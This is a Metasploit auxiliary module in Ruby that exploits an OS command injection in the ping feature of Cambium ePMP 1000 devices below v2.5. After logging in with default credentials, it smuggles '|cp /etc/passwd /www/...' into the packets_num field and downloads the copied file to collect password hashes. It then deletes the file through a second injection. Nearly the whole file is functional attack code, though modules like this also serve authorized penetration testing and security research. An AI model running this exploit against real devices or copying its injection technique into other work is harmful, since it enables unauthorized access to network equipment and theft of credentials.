##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::EPMP

  def initialize(info = {})
    super(update_info(info,
      'Name' => "Cambium ePMP 1000 'ping' Password Hash Extractor (up to v2.5)",
      'Description' => %{
          This module exploits an OS Command Injection vulnerability in Cambium
          ePMP 1000 (<v2.5) device management portal. It requires any one of the
          following login credentials - admin/admin, installer/installer, home/home - to
          dump system hashes.
      },
      'References' =>
        [
          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/'],
          ['URL', 'https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83']
        ],
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'License' => MSF_LICENSE
     )
    )

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),
        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])
      ], self.class
    )

    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
  end

  def run_host(ip)
    unless is_app_epmp1000?
      return
    end
  end

  # Command Execution
  def hash_dump(config_uri, cookie)
    random_filename = Rex::Text::rand_text_alpha(8)
    command = 'cp /etc/passwd /www/' + random_filename
    inject = '|' + "#{command}" + ' ||'
    clean_inject = CGI.unescapeHTML(inject.to_s)

    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => config_uri,
        'cookie' => cookie,
        'headers' => {
          'Accept' => '*/*',
          'Accept-Language' => 'en-US,en;q=0.5',
          'Accept-Encoding' => 'gzip, deflate',
          'X-Requested-With' => 'XMLHttpRequest',
          'ctype' => '*/*',
          'Connection' => 'close'
        },
        'vars_post' =>
          {
            'ping_ip' => '127.0.0.1', # This parameter can also be used for injection
            'packets_num' => clean_inject,
            'buf_size' => 0,
            'ttl' => 1,
            'debug' => '0'
          }
      }, 25
    )

    good_response = (
      res &&
      res.code == 200
    )

    if good_response
      # retrieve passwd file
      res = send_request_cgi(
        {
          'method' => 'GET',
          'uri' => '/' + random_filename,
          'cookie' => cookie,
          'headers' => {
            'Accept' => '*/*',
            'Accept-Language' => 'en-US,en;q=0.5',
            'Accept-Encoding' => 'gzip, deflate',
            'X-Requested-With' => 'XMLHttpRequest',
            'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Connection' => 'close'
          }
        }, 25
      )

      good_response = (
        res &&
        res.code == 200 && res.body =~ /root/
      )

      if good_response
        print_status("#{rhost}:#{rport} - Dumping password hashes")

        path = store_loot('ePMP_passwd', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 password hashes')
        print_status("#{rhost}:#{rport} - Hashes saved in: #{path}")

        # clean up the passwd file from /www/
        command = 'rm /www/' + random_filename
        inject = '|' + "#{command}" + ' ||'
        clean_inject = CGI.unescapeHTML(inject.to_s)

        res = send_request_cgi(
          {
            'uri' => config_uri,
            'method' => 'POST',
            'cookie' => cookie,
            'headers' => {
              'Accept' => '*/*',
              'Accept-Language' => 'en-US,en;q=0.5',
              'Accept-Encoding' => 'gzip, deflate',
              'X-Requested-With' => 'XMLHttpRequest',
              'ctype' => '*/*',
              'Connection' => 'close'
            },
            'vars_post' =>
              {
                'ping_ip' => '127.0.0.1', # This parameter can also be used for injection
                'packets_num' => clean_inject,
                'buf_size' => 0,
                'ttl' => 1,
                'debug' => '0'
              }
          }
        )
      else
        check_file_uri = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + '/' + random_filename
        print_error("#{rhost}:#{rport} - Could not retrieve hashes. Try manually by directly accessing #{check_file_uri}.")
      end
    else
      print_error("#{rhost}:#{rport} - Failed to dump hashes.")
    end
  end

  #
  # Login & initiate Password Hash dump
  #

  def do_login(epmp_ver)
    if epmp_ver < '2.5' # <3.4.1 uses login_1
      cookie, _blah1, _blah2, _blah3, config_uri_ping = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
      if cookie == 'skip' && config_uri_ping == 'skip'
        return
      else
        hash_dump(config_uri_ping, cookie)
      end
    else
      print_error('This ePMP version is not vulnerable. Module will not continue.')
    end
  end
end
